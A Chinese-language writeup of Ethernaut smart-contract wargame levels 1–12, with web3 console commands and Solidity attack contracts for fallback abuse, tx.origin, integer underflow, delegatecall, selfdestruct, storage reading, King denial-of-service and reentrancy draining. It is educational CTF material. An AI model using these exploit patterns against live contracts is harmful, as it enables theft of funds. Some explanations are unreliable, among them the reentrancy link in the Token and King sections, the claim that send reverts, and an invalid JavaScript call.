# Ethernaut Challenges Writeup
## 项目介绍

[Ethernaut](https://ethernaut.openzeppelin.com/) 是 OpenZeppelin 开发的一个 Web3/Solidity 的游戏，通过闯关的方式来学习智能合约安全。每一关都是一个需要被攻破的智能合约，通过发现和利用合约中的漏洞来通过挑战。本项目记录了suu的每日解题过程。仅供参考，欢迎交流。

个人感觉的难度：
- [Easy] - 基础概念和简单漏洞
- [Medium] - 需要理解合约机制和常见攻击方式
- [Hard] - 复杂的漏洞利用和高级概念

## 08.01.2025

## 01. Fallback ✅ [Easy]

这关主要考察 fallback 函数的知识点：
- `receive()` 函数在合约接收 ETH 时被调用
- `fallback()` 函数在调用不存在的函数时被调用
- 通过发送少量 ETH 并调用 `contribute()` 函数来满足条件
- 最后通过 `receive()` 函数获取合约所有权

攻击步骤：
1. 调用 `contribute()` 并发送少量 ETH (<0.001)
```js
await contract.contribute({value: web3.utils.toWei('0.0001')});
```

2. 直接向合约发送 ETH 触发 `receive()`
```js
await contract.sendTransaction({value: web3.utils.toWei('0.0001')});
```

3. 调用 `withdraw()` 提取所有 ETH
```js
await contract.withdraw();
```

## 02. Fallout ✅ [Easy]

这关主要考察早期 Solidity 版本的构造函数问题：
- 老版本使用与合约同名的函数作为构造函数
- 如果函数名称与合约名不完全一致,就变成了普通函数
- 攻击者可以直接调用该函数获取所有权

攻击步骤：
1. 直接调用 `Fal1out()` 函数获得合约所有权
```js
await contract.Fal1out();
```

2. 调用 `collectAllocations()` 提取资金
```js
await contract.collectAllocations();
```

学习要点：
- 构造函数的安全性
- 代码审计的重要性
- 新版本使用 `constructor` 关键字更安全

## 03. Coin Flip ✅ [Medium]

这关主要考察区块链的随机数问题：
- 链上随机数可以被预测
- `block.number` 等区块信息是公开的
- 攻击者可以在同一区块复制计算逻辑

攻击步骤：
1. 部署攻击合约复制游戏合约的计算逻辑
2. 手动调用 `attackCoin()` 十次（每次等待新区块）
3. 确认胜利次数达到10次

> 注意：不能使用循环连续调用 `attackCoin()` 十次，因为每次猜测都需要在不同区块中进行。如果在同一个区块中多次调用，会使用相同的 `blockhash`，导致预测结果相同。

攻击合约代码：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attack {
    ICoinFlip public targetContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        targetContract = ICoinFlip(_targetAddress);
    }

    function attackCoin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
```

学习要点：
- 链上随机数的局限性
- 不应使用区块信息作为随机源
- 可以使用 Chainlink VRF 等预言机获取真随机数
- 理解区块链的时序性，每个区块的信息都是唯一的

## 04. Telephone ✅ [Easy]

这关主要考察对tx.origin的理解：
- tx.origin 是交易的发送者
- 攻击者可以利用 tx.origin 来欺骗合约，使其认为攻击者是合约的拥有者

攻击步骤：
1. 写一个攻击合约
2. 调用 `changeOwner()` 函数，将合约的 owner 设置为攻击者

学习要点：
- 理解 tx.origin 的局限性
- 使用 msg.sender 更安全

## 05. Token ✅ [Easy]

这关主要考察对solidity的漏洞的理解：
- 在 Solidity 0.6.x 及更早版本中，`transfer()` 和 `send()` 函数存在漏洞
- 在 Solidity 0.6.x 中，如果 balances[msg.sender] 小于 _value，balances[msg.sender] -= _value; 会发生 整数下溢（uint 从 0 减去 1 会变成 2^256 - 1）。
这会导致攻击者的余额变得非常大。
- 这些函数在处理错误时不会回滚交易，而是返回 false
- 攻击者可以利用这些漏洞进行重入攻击

攻击步骤：
1. 先查看自己的msg.sender的余额
2. 调用 `transfer()` 函数
```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```
3. 查看自己的余额，发现余额增加了

学习要点：
- 理解 Solidity 0.6.x 的整数下溢漏洞
- 使用更安全的函数和库(SafeMath或者自行添加溢出检查)

## 06. Delegation ✅ [Easy]

这关主要考察对delegatecall的理解：
- delegatecall 是低级调用，可以调用另一个合约的代码，delegatecall 是一种底层函数调用，它允许合约 A 执行合约 B 的代码，但使用 A 的存储上下文。换句话说，合约 B 的逻辑会影响合约 A 的状态。
- 攻击者可以利用 delegatecall 来调用合约的代码，从而获取合约的所有权

攻击步骤：
1. await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
web3.utils.sha3("pwn()") 会生成函数签名的哈希值
.slice(0,10) 取哈希值的前 4 字节（这是函数选择器）

学习要点：
- 在使用 delegatecall 时，必须确保被调用合约的逻辑与当前合约的存储布局一致，否则可能导致存储被意外覆盖。
- 实际开发中避免漏洞

- 避免在 fallback 函数中使用 delegatecall，除非有严格的访问控制。
- 使用现代的合约框架（如 OpenZeppelin 的 Proxy 合约）来实现代理逻辑。

## 07. Force ✅ [Medium]

这关主要考察对selfdestruct的理解：
- selfdestruct 是 Solidity 中的一个低级函数，用于销毁合约并将其所有余额发送给指定的目标地址。
- 攻击者可以利用 selfdestruct 来强制将合约的余额发送给目标地址

攻击步骤：
1. 部署一个新合约并向该合约发送以太币。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor() public payable {
        // 构造函数可接收以太币
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

2. 调用 `attack()` 函数，将合约的余额发送给目标地址
```js
// 调用攻击函数，强制发送以太币
await attackContract.attack(contract.address);
// 验证 Force 合约的余额
const balance = await web3.eth.getBalance(contract.address);
console.log("Force Contract Balance:", balance);
```

学习要点：
- 理解 selfdestruct 的机制
- 确保你的合约逻辑不依赖于余额为零的假设。
- 避免在代码中直接检查合约余额。

## 08. Vault ✅ [Easy]

这关主要考察对区块链的存储的理解：
- 区块链的存储是公开的，任何人都可以查看，哪怕存储是private的数据也可以查看
- 攻击者可以利用区块链的存储来获取合约的密码
- Solidity 中的所有状态变量都存储在合约的存储槽（Storage Slots）中。
- 公共变量（如 locked）可以直接通过合约接口读取。
- 私有变量（如 password）虽然标记为 private，但实际上只是在 Solidity 中不可直接通过合约代码访问。它们仍然可以通过低级的存储读取方法（如 web3.eth.getStorageAt）获取。

攻击步骤：
1. 使用 web3.eth.getStorageAt 读取存储槽 1 的内容（password 存储在存储槽 1）。
```js
await web3.eth.getStorageAt(contract.address, 1).toString();
```
2. 将读取到的密码作为参数调用 `unlock()` 函数。
```js
await contract.unlock(password);
```

学习要点：
- 理解 Solidity 中的存储布局
- 使用低级函数（如 web3.eth.getStorageAt）来访问私有变量
- 不要将敏感数据直接存储在链上，即使使用 private 关键字。
- 如果需要存储敏感数据，建议使用加密方式存储，并仅在必要时解密。

## 09. King ✅ [Easy]

这关主要考察对重入攻击特殊变体的理解了：
- 重入攻击是指攻击者利用合约的漏洞，在合约执行过程中多次调用某个函数，从而获取更多的利益。
- 攻击者可以利用重入攻击来获取合约的控制权

攻击步骤：
1. 如果当前国王是一个智能合约，而该合约的 receive 函数无法接收 ETH（或者故意导致交易失败），新的国王就无法成功调用 receive，从而阻止任何其他玩家成为新的国王。
2. 部署一个攻击合约，并通过攻击合约成为国王。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public payable {
        // 调用目标合约，并成为新的国王
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 故意让接收 ETH 的函数失败
    receive() external payable {
        revert("I refuse to give up the throne!");
    }
}
```

3. 部署攻击合约并提供足够的 ETH（大于当前的 prize）

学习要点：
- 理解receive函数的作用：在目标合约中，receive 函数是接收 ETH 的核心逻辑。如果接收方不能正确处理 ETH 转账，会导致交易失败。
- 防御建议：避免使用低级调用（如 call）进行转账，可以使用 transfer 或 send，它们在转账失败时会自动回滚。
- 在合约设计中，避免依赖外部合约的行为来完成核心逻辑。
- 使用现代的合约框架（如 OpenZeppelin 的 ReentrancyGuard）来实现安全重入控制

## 10. Re-entrancy ✅ [Medium]

这关主要考察对re-entrancy的理解：
- 重入攻击是指攻击者利用合约的漏洞，在合约执行过程中多次调用某个函数，从而获取更多的利益。
- 攻击者可以利用重入攻击来获取合约的控制权

攻击步骤：
1. 编写攻击合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public target;
    address public owner;

    constructor(address payable _target) public {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    // 调用目标合约的 donate 函数
    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    // 发起攻击
    function attack(uint256 _amount) public {
        target.withdraw(_amount);
    }

    // 重入逻辑
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    // 提取攻击合约中的以太币
    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
2. 调用 `donate()` 函数，将合约的余额发送给攻击合约
```js
await contract.donate{value: 1 ether}();
```
3. 调用 `attack()` 函数，发起攻击
```js
await attackContract.attack(1 ether);
```

学习要点：
- 理解 re-entrancy 的机制
- 使用现代的合约框架（如 OpenZeppelin 的 ReentrancyGuard）来实现安全重入控制

## 11. Elevator ✅ [Easy]

这关主要考察对interface的理解：
- interface 是 Solidity 中的一种抽象合约，用于定义合约的函数签名，但不包含实现代码。
- 攻击者可以利用实现 interface 的合约但是使用含有攻击的function来获取合约的控制权

攻击步骤：
1. 主要是实现了interface的攻击合约的编写
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator public target;
    bool public toggle;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle; // 切换返回值
        return toggle;
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }
}
```

学习要点：
- 限制接口调用者: 验证调用者是否为可信合约或特定地址。
- 使用 require 检查 msg.sender
```solidity
require(msg.sender == trustedAddress, "Unauthorized caller");
```
- 逻辑验证: 避免完全依赖外部合约的返回值，加入内部验证逻辑。


## 12. Privacy ✅ [Easy]

这个关卡主要考察对存储槽和数据保护的理解：
- 存储槽是 Solidity 中用于存储变量的空间，每个存储槽都有一个唯一的索引。
- 攻击者可以利用存储槽来获取合约的私有数据

攻击步骤：
1. 首先分析：Solidity 存储布局，状态变量按顺序存储在存储槽中：
locked 位于槽 0。
ID 位于槽 1。
flattening, denomination, 和 awkwardness 共用槽 2。
data 数组从槽 3 开始，分别存储 data[0], data[1], 和 data[2]。
尽管data 的存储内容是私有的（private），但在以太坊上，所有存储槽都是可通过低级工具（如 web3.eth.getStorageAt）读取的。
2. 使用 web3.eth.getStorageAt 读取存储槽 5 的内容
```js
await web3.eth.getStorageAt(contract.address, 5).toString();
```
3. 将读取到的 key 转换为 bytes16，然后调用 unlock 函数：
```js
await contract.unlock(key.slice(0, 34)); // 使用前 16 字节
```

学习要点：
- flattening, denomination, 和 awkwardness 共用槽 2：
  - 存储槽规则
  - 一个存储槽大小为 32 字节（256 位）。
  - 如果多个状态变量的总大小不超过 32 字节，它们会共用同一个槽。
  - 变量大小
  - flattening 是 uint8（1 字节）。 
  - denomination 是 uint8（1 字节）。
  - awkwardness 是 uint16（2 字节）。
  - 它们总共占用 1 + 1 + 2 = 4 字节，远小于 32 字节，因此 Solidity 将它们打包到同一个槽（槽 2）。
- 关于 key.slice(0, 34) 的原因
  - 在 JavaScript 中，web3.eth.getStorageAt 返回的是一个以太坊存储槽内容的十六进制字符串，类似于 0x 开头的 64 个字符（32 字节）。每两个字符表示 1 字节，因此：
  - key 的长度是 66 个字符（包括前缀 0x）。
  - 前 16 字节的十六进制表示需要 32 个字符（16 字节 * 2 个字符/字节）。
  - 加上 0x 的前缀，总共是 34 个字符。
  - 因此，key.slice(0, 34) 提取的就是前 16 字节的十六进制表示。

## 13. Gatekeeper One 🔒

## 14. Gatekeeper Two 🔒

## 15. Naught Coin 🔒

## 16. Preservation 🔒

## 17. Recovery 🔒

## 18. Magic Number 🔒

## 19. Alien Codex 🔒

## 20. Denial 🔒

## 21. Shop 🔒

## 22. Dex 🔒

## 23. Dex Two 🔒

## 24. Puzzle Wallet 🔒

## 25. Motorbike 🔒

## 26. DoubleEntryPoint 🔒

## 27. Good Samaritan 🔒

## 28. Gatekeeper Three 🔒

## 29. Switch 🔒

## 30. Privacy 2 🔒

## 31. Climber 🔒

## 32. Recovery 2 🔒

## 33. Puppet 🔒

